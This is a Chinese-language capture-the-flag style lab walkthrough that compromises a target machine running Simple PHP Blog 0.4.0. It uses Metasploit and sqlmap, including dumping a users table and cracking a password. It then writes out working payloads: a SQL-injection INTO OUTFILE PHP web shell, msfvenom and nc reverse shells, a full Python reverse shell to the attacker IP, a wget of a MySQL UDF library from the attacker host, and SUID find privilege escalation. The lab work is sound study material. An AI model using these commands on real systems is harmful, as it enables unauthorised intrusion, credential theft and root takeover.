
# 0X00 环境
**攻击机：10.10.10.1**<br />**靶机：10.10.10.100**


# 0X01 信息收集
使用[NMAP](https://www.yuque.com/xmtxsec/network_security/xm1y1f)进行端口扫描
```
nmap -sV -A 10.10.10.100 -p-
```
![image.png](../../_img\06-靶场实践/1671430832355-88534d3f-f65a-407d-b038-358f32c1249f.png)

访问80端口，一个简约的网站，有登录和账户创建页面。
![image.png](../../_img\06-靶场实践/1671431018300-48dbd04a-2029-4dfa-a52c-6b6c6c19c959.png)

目录扫描
![image.png](../../_img\06-靶场实践/1671432446548-b50e2979-32ea-4d89-a0a6-17c0839bd075.png)

扫描出一个Blog页面[http://10.10.10.100/blog/](http://10.10.10.100/blog/)
![image.png](../../_img\06-靶场实践/1671432507518-7000ca65-4a4c-4ff7-9619-d0ece0e4e382.png)

查看前端源码发现是Simple PHP Blog 0.4.0
![image.png](../../_img\06-靶场实践/1671432541987-682533de-f3b9-4509-853f-22b3e3b3ff35.png)

# 0X02 漏洞发现 
搜索发现该版本存在漏洞
![image.png](../../_img\06-靶场实践/1671432647062-9531b44f-8c85-4e29-8dda-167d25a12dd7.png)

 在80端口有个一个登陆页面，尝试是否存在SQL注入
![image.png](../../_img\06-靶场实践/1671499968229-b1015d06-9057-467c-aebd-abb95f3ddb6b.png)
存在SQL注入
![image.png](../../_img\06-靶场实践/1671499953731-72f54e02-77c3-4933-9649-1fb6f24206aa.png)


# 0X03 漏洞利用 
打开[Metasploit](https://www.yuque.com/xmtxsec/network_security/mc8ier)搜索Simple PHP Blog 0.4.0
```
search Simple PHP Blog 0.4.0
```
![image.png](../../_img\06-靶场实践/1671432838672-c651817b-d0ee-4245-9e78-5c0535df6f01.png)

利用该漏洞模块，并设置参数
```
msf6 > use 0
msf6 exploit(unix/webapp/sphpblog_file_upload) > set RhOSTS 10.10.10.100
msf6 exploit(unix/webapp/sphpblog_file_upload) > set URI /blog
```
![image.png](../../_img\06-靶场实践/1671433029469-cbb2eb2e-22ea-4c39-b730-07f225577b19.png) 

执行
```
msf6 exploit(unix/webapp/sphpblog_file_upload) > exploit
```
![image.png](../../_img\06-靶场实践/1671433466851-62aeb0d0-3a8d-4c73-975e-f13e6aaf8bc8.png)

这里虽然创建了会话，但是并不能执行命令
![image.png](../../_img\06-靶场实践/1671434163114-86f90593-748c-4242-9967-924a612e659c.png)

幸运的是这里给我们创建了凭据
![image.png](../../_img\06-靶场实践/1671434213078-a7681ef4-75c2-48f9-90de-dea5c078fb2e.png)

尝试使用凭据登录，登陆失败
![image.png](../../_img\06-靶场实践/1671499751906-9e2afaec-939b-4b63-bab0-15e5f3f163a1.png)

在前面我们还发现存在一个SQL注入漏洞，适用burpsuite抓包
![image.png](../../_img\06-靶场实践/1671500207542-cd53155e-b8c1-42f2-8a06-9e749694f127.png)

将数据包保存到文件中使用[SQLMAP](https://www.yuque.com/xmtxsec/network_security/ky08tt)进行扫描
```
sqlmap -r sql.txt
```
![image.png](../../_img\06-靶场实践/1671501577957-723a9dd5-8083-455f-9b6f-1060a1c7a86d.png)

爆库
```
sqlmap -r sql.txt --dbs
```
![image.png](../../_img\06-靶场实践/1671501636072-9e119530-4b01-4146-8ff0-cdb8891d6344.png)

查看ch16数据库中的数据表
```
sqlmap -r sql.txt -D ch16 --tables
```
![image.png](../../_img\06-靶场实践/1671501741459-07589780-b168-4bd4-9bba-95199af67f69.png)

查看user表
```
sqlmap -r sql.txt -D ch16 -T users --columns
```
![image.png](../../_img\06-靶场实践/1671501895998-aeefb0cd-cb17-4fb6-93ee-bdc68af9f56b.png)

查看email和pass中的数据
```
sqlmap -r sql.txt -D ch16 -T users -C email,pass --dump
```
![image.png](../../_img\06-靶场实践/1671502546010-eb551e28-0e22-4302-8143-e52d2b6b6b7b.png)

解密得到admin@isints.com/killerbeesareflying尝试登陆，并没有什么有用的信息
![image.png](../../_img\06-靶场实践/1671503212695-0cd5605b-606a-41ad-b19a-19a8c0e8373a.png)

创建一个shell尝试使用SQLMAP写入shell
```
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.1 lport=666 -f raw -o shell.php
```
![image.png](../../_img\06-靶场实践/1671503508972-29f4f6a5-c77a-4905-b7a5-6c96172fd3b5.png)

```
sqlmap -r sql.txt --batch  --file-write shell.php  --file-dest /var/www/shell.php
```
![image.png](../../_img\06-靶场实践/1671504173557-0e3e6f88-5fd7-4816-9832-a96058b2678a.png)
写入失败

手工尝试，在上面的SQLMAP中我们可以得到SQL语句为
```
1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171626a71,0x437465517663465354486c676f45466a42574e786f53694f544e4e754d47634a4261624f4a527676,0x71706b7871),NULL,NULL,NULL,NULL-- -
```

在其基础上进行修改，查看是否具有load_file权限
```
1' UNION ALL SELECT NULL,NULL,NULL,load_file('/etc/passwd'),NULL,NULL,NULL,NULL-- -
```
![image.png](../../_img\06-靶场实践/1671504397590-8ffe83de-5ba8-4bc1-be38-82767e3f366b.png)

具有load_file权限，尝试写入木马
```
1' union select null,null,null,"<?php system($_GET['cmd']);?>",null,null,null,null into outfile '/var/www/shell.php'-- -
```
![image.png](../../_img\06-靶场实践/1671504547296-59112fdb-2d50-4142-83c7-32ddd5abcea0.png)

尝试执行命令
```
http://10.10.10.100/shell.php?cmd=id
```
![image.png](../../_img\06-靶场实践/1671504622022-3a37d9b4-a820-43ef-945f-4fa81e7e5fa8.png)

尝试使用NC反弹shell
```
http://10.10.10.100/shell.php?cmd=/bin/nc 10.10.10.1 4444 -e /bin/bash
```
![image.png](../../_img\06-靶场实践/1671504835434-c477f257-b7a3-4c6a-bd8d-93acd3198cab.png)
失败

尝试python获取反向shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
![image.png](../../_img\06-靶场实践/1671505423558-fcd444d5-3e98-433a-9a5c-7c24ec6e8f51.png)
成功


# 0X04 提权 
在/var/www/目录下找到一个文件为mysqli_connect.php里面记录了数据库的账号和密码
![image.png](../../_img\06-靶场实践/1671505801049-99739b02-3e09-49d1-a8e7-5e376188167d.png)

但是登录失败
![image.png](../../_img\06-靶场实践/1671505860631-b9018bc4-eaaa-4296-8d73-2c3b8eb9f3a0.png)

在/var目录下找到也有mysqli_connect.php
![image.png](../../_img\06-靶场实践/1671505926373-d6c7d019-84ec-4fed-9a41-cf9e88fd810c.png)

再次尝试登录数据库，成功
![image.png](../../_img\06-靶场实践/1671505976885-b51d2b19-950f-4f4c-a910-eea0bf031919.png)

在前面我们可以写入文件，这里可能可以使用UDF提权，UDF提权详情见[0X04 数据库内置函数研究](https://www.yuque.com/xmtxsec/network_security/anq3ng)
查看 secure_file_priv 的值

- 当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出文件，此时无法提权。
- 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出文件只能发生在 /tmp/ 目录下，此时也无法提权。
- 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出文件做限制，此时可提权。
```
show global variables like 'secure%';
```
![image.png](../../_img\06-靶场实践/1671506224636-cfc28126-8a5a-476c-b900-38dd20f766d0.png)

查看mysql数据库plugin目录位置
```
show global variables like 'plugin%';
```
![image.png](../../_img\06-靶场实践/1671507050759-2f8822b8-07e1-44fe-93bf-968a9ef97687.png)

查看mysql框架
```
show variables like '%compile%';
```
![image.png](../../_img\06-靶场实践/1671506351133-8c7e65df-9f0f-4cb8-8289-2d7cb45d0b80.png)


将合适的UDF文件上传到plugin目录位置
```
cd /usr/share/metasploit-framework/data/exploits/mysql
python2 -m SimpleHTTPServer 6666
```
![image.png](../../_img\06-靶场实践/1671506761742-085fba2b-cbdf-4701-ba37-70d8ec6c7ebe.png)

```
cd /usr/lib/mysql/plugin
wget http://10.10.10.1:6666/lib_mysqludf_sys_64.so
```
![image.png](../../_img\06-靶场实践/1671507143761-e3fca2a9-303a-4b98-b8b5-65301bc710a3.png)

创建sys_eval函数
```
create function sys_eval returns string soname 'lib_mysqludf_sys_64.so';
```
![image.png](../../_img\06-靶场实践/1671507835204-b1d98194-7999-4bfd-bf95-9403829f6ec9.png)

尝试执行系统命令
```
select sys_eval('whoami');
```
![image.png](../../_img\06-靶场实践/1671507886216-c46e39ae-4c25-4eef-9c88-1892dc3cd729.png)
 <br />给find命令赋root的sid权限，并执行find命令，获得一个拥有sid root权限
```
select sys_eval('chmod u+s /usr/bin/find');
exit
touch test.txt
find test.txt -exec '/bin/sh' \;
```
![image.png](../../_img\06-靶场实践/1671510150927-5f86720e-34fb-4a8b-bf77-ae47294cb848.png)
